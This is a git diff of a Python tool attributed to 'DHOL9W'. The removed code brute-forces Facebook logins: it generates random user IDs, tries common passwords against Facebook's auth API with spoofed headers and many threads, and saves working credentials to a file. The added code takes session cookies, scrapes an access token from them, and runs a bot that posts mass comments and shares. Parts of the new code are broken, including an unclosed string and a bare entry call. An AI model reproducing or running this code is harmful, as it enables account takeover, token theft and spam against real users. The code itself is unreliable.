@@ -1,130 +1,154 @@
-#----------------------------[IMPORT/MODULE]-----------------------------------#
-import requests,bs4,json,os,sys,uuid,random,datetime,time,re
-import urllib3,rich,base64
-os.system('xdg-open https://www.facebook.com/profile.php?id=rana.numan.7965')
-print('\n \033[1;92m[✓]\r\r\033[1;92m WELCOME. TO DHOL9W RUL3X T00L ....!')
-from rich.markdown import Markdown as mark
-from rich.columns import Columns as col
-from rich import pretty
-from rich.text import Text as tekz
-from time import localtime as lt
-import os,time,random,json,sys,datetime
-try:
-    import requests
-except:
-    os.system("pip3 install requests")
-    import requests 
-from concurrent.futures import ThreadPoolExecutor as ThreadPool
-#-----------------------------[LINE]-----------------------------------#
-def lin():
-	print("\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m")
- 
-#----------------------------[COLOR/CODE]-----------------------------------#
-A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
-#----------------------------[USER/AGENT]-----------------------------------#
-def windows():
-    aV=str(random.choice(range(10,20)))
-    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
-    bV=str(random.choice(range(1,36)))
-    bx=str(random.choice(range(34,38)))
-    bz=f"5{bx}.{bV}"
-    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
-    cV=str(random.choice(range(1,36)))
-    cx=str(random.choice(range(34,38)))
-    cz=f"5{cx}.{cV}"
-    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
-    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
-    return random.choice([A,B,C,D])
-#----------------------------[LOGO]-----------------------------------#
-logo = (f"""        
- 
- 
- 
-\033[1;32m###############################################
-\033[1;31m#
-\033[1;31m#
-   
+from os import path
+import os,base64,zlib,pip,urllib
 
-██████╗ ██╗  ██╗ ██████╗ ██╗     █████╗ ██╗    ██╗
-██╔══██╗██║  ██║██╔═══██╗██║    ██╔══██╗██║    ██║
-██║  ██║███████║██║   ██║██║    ╚██████║██║ █╗ ██║
-██║  ██║██╔══██║██║   ██║██║     ╚═══██║██║███╗██║
-██████╔╝██║  ██║╚██████╔╝███████╗█████╔╝╚███╔███╔╝
-╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚════╝  ╚══╝╚══╝ 
-                                                  
-                                        
-                                          
-\033[1;31m#                             
-\033[1;31m################################################
-\033[1;31m[\033[1;32m≈\033[1;31m]\033[1;32m DEVELOPER   :  DHOL9W
-\033[1;31m[\033[1;32m≈\033[1;31m]\033[1;32m FACEBOOK    :  DHOL9W 
-\033[1;31m[\033[1;32m≈\033[1;31m]\033[1;32m STATUS      :  DHOL9W OWNFIIREW 
-\033[1;31m[\033[1;32m≈\033[1;31m]\033[1;32m GITHUB      :  https://github.com/DHOL9W 
-\033[1;31m[\033[1;32m≈\033[1;31m]\033[1;32m VERSION : 2.0
-\033[1;31m[\033[1;32m≈\033[1;31m]\033[1;32m TOOL        :  \033[1;34mOld Crack\033[1;32m
-\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-\033[1;31m[\033[1;32m≈\033[1;31m]\033[1;32m DHOL9W  :  \033[1;91m\033[1;41m\033[1;33m DHOL9W \033[;0m\033[1;91m\033[1;92m\033[38;5;46m
-\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m""")
-#----------------------------[MAIN/DEF]-----------------------------------#
-def main():
-    user=[]
+import os,sys,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re
+
+
+#_______[ BASIC COLORS ]_____>>
+white = '\033[1;37m'
+red = '\033[1;31m'
+green = '\x1b[38;5;46m'
+yellow = '\033[1;33m'
+blue = '\033[1;34m'
+orange = '\033[1;35m'
+extra ='\x1b[38;5;208m'
+black="\033[1;30m"
+#_________[ LOGO ]______>>>
+def logo():
     os.system("clear")
-    print(logo)
-    print(f'\033[1;31m[\033[1;32m=\033[1;31m] \033[1;32mEXAMPLE    \033[1;33m : \033[1;32m5000/10000/99999')
-    lin()
-    limit=input(f"\033[1;31m[\033[1;32m?\033[1;31m]\033[1;32m INPUT \033[1;31m\033[1;32m: ")
-    lin()
-    os.system('clear')
-    print(logo)
-    print(f'\033[1;31m[\033[1;32m1\033[1;31m] \033[1;32m2010-2014 ')
-    lin()
-    ask=input(f"\033[1;31m[\033[1;32m?\033[1;31m] INPUT \033[1;32m:\033[1;33m ")
-    lin()
-    if ask in["1"]:
-        newrin="10000"
-        for i in range(int(limit)):
-            data=str(random.choice(range(1000000000,1999999999)))
-            user.append(data)
-    with ThreadPool(max_workers=40) as Tx:
-        os.system('clear')
-        print(logo)
-        print(f'\x1b[38;5;196m[\x1b[38;5;46m=\x1b[38;5;196m]\x1b[38;5;46m TOTAL ID : {limit} \x1b[38;5;196m')
-        print(f'\x1b[38;5;196m[\x1b[38;5;46m+\x1b[38;5;196m]\x1b[38;5;46m TURN \x1b[38;5;196m[\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m]\x1b[38;5;46m AIRPLANE MODE EVERY 3 MIN')
-        lin()
-        for chin in user:
-            uid=newrin+chin
-            Tx.submit(login,uid)    
-loop=0
-oks=[]
-def login(uid):
-    global oks,loop
-    Session=requests.session()
+    print(f"""
+
+    
+     
+   _   _   _   _   _   _  
+  / \ / \ / \ / \ / \ / \ 
+ ( D | H | O | L | A | W )
+  \_/ \_/ \_/ \_/ \_/ \_/ 
+
+-------------------------------------------------
+Owner            :           DhoLaw
+Github           :           LeGGend    
+version          :           0.01
+Status           :           DhoLaw RuLex
+    print(54*'-')
+
+
+
+def devi():
+    logo()
+    print("[1] Comment Bot")
+    print("[2] Shareing Bot")
+    print("[E] Exit tool")
+    print(54*"-")
+    okh =input("[?] Choose option : ")
+    if okh in ["01","1"]:
+        main()
+    if okh in ["02","2"]:
+        login()
+    if okh in ["E","e"]:
+        exit()
+    else:
+        exit("[×] Re-Run Cammands")
+
+def main():
+    logo()
+    cookies = input(' [?] input cookies : ')
+    logo()
+    limit = int(input('[?] Limit of comments : '))
+    logo()
+    print('[*] Use a comma to separate text comments')
+    print('[*] for example: hell bro, Great Job')
+    print(54*"-")
+    text_comment = input('[?] Text comment : ')
+    print(54*"-")
+    print("[?] Put Post Link 🔗 like that : 2551707761661610")
+    print(54*"-")
+    userid = input('[?] Post id : ') 
+    with requests.Session() as x:
+         x.headers.update({
+            "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com",
+            "origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0",
+            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8",
+         })
+         try:
+               link = x.get("https://business.facebook.com/business_locations", cookies = {'cookie':cookies})
+               search = re.search("(EAAG\w+)", link.text).group(1)
+               if 'EAAG' in search:
+                   comment(cookies,search,limit,text_comment,userid)
+         except AttributeError:exit('\n [×] failed comment, invalid cookie')
+
+def comment(coki,token,limit,text_comment,userid):
+    a = 0
+    for _ in range(limit):
+        a +=1
+        for z in text_comment.split(','):
+            b = requests.post(f'https://graph.facebook.com/{userid}/comments/?message={z}&access_token={token}', cookies={'cookie':coki})
+            if 'We limit how often you can post, comment, or do other things in a certain amount of time to help protect the community from spam. You can try again later. Learn More' in b.text:
+                exit('\n [×] account restricted dude ')
+            if 'id' in b.text:
+                print(f'\r[*] Total Comments : {a}',end=' ')
+            else:
+                continue
+
+uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
+id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
+plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
+xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
+bxd = ""
+
+bumper = f'{id}{xp}'
+
+
+import os, re, requests, json, bs4
+from bs4 import BeautifulSoup as parser
+ses=requests.Session()
+
+def login():
+    logo()
+    cookie = input("[?] Put cookie : ")
     try:
-        sys.stdout.write(f'\r\x1b[38;5;196m[\x1b[38;5;48mFINDING\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\033[1;32m{loop}\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK•{len(oks)}\x1b[38;5;196m]')
-        sys.stdout.flush()
-        for pw in ["123456","1234567","12345678","123456789","123123","143143"]:
-            headers = {
-            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
-            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
-            "x-fb-net-hni": str(random.randint(20000, 40000)), 
-            "x-fb-connection-quality": "EXCELLENT",
-            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-            "user-agent": windows(), 
-            "content-type": "application/x-www-form-urlencoded", 
-            "x-fb-http-engine": "Liger"}
-            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
-            if "session_key" in rp:
-                print(f"\r\r\033[1;30m[\033[1;33mZIDI\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
-                open("/sdcard/DHOL9W-OLD-OK","a").write(uid+"|"+pw+"\n")
-                oks.append(uid)
-                break 
-            elif "www.facebook.com" in rp["error_msg"]:
-                print(f"\r\r\033[1;30m[\033[1;33mDHOL9W\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
-                open("/sdcard/DHOL9W-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
-                oks.append(uid)
-                break
-            else:continue
-        loop+=1
-    except:pass
-main()
-#----------------------------[CODE/END]-----------------------------------#
+        data = ses.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie})
+        find_token = re.search("(EAAG\w+)", data.text)
+        open("token.txt", "w").write(find_token.group(1))
+        open("cookie.txt", "w").write(cookie)
+        menu()
+    except:
+        os.system("rm token.txt cookie.txt")
+        exit("[×] May Be cookies Expired or Incorrect Link")
+        
+    
+def menu():
+    try:
+        token = open("token.txt","r").read()
+        cok = open("cookie.txt","r").read()
+        cookie = {"cookie":cok}
+        nama = ses.get(f"https://graph.facebook.com/me?fields=name&access_token={token}",cookies=cookie).json()["name"]
+    except:
+        login()
+    logo()
+    print(f"[❤] Welcome  {nama} To Shareing Tool")
+    print(54*"-")
+    idt = input("[>] Put Post Full link : ")
+    print(54*"-")
+    limit = int(input("[?] Put Shareing limit : "))
+    logo()
+    try:
+        n = 0
+        header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36"}
+        for x in range(limit):
+            n+=1
+            post = ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={idt}&published=0&access_token={token}",headers=header, cookies=cookie).text
+            data = json.loads(post)
+            if "id" in post:
+                print(f"[{n}] SUCCESSFULLY SHARED {data['id']}")
+            else:
+                exit("[×] may Be Cookies Expired or Incorrect link 🔗")
+    except:
+        exit("[×] may Be Cookies Expired or Incorrect link 🔗 ")
+    
+
+
+        
+
+if __name__ == '__main__':
+    DhoLaw
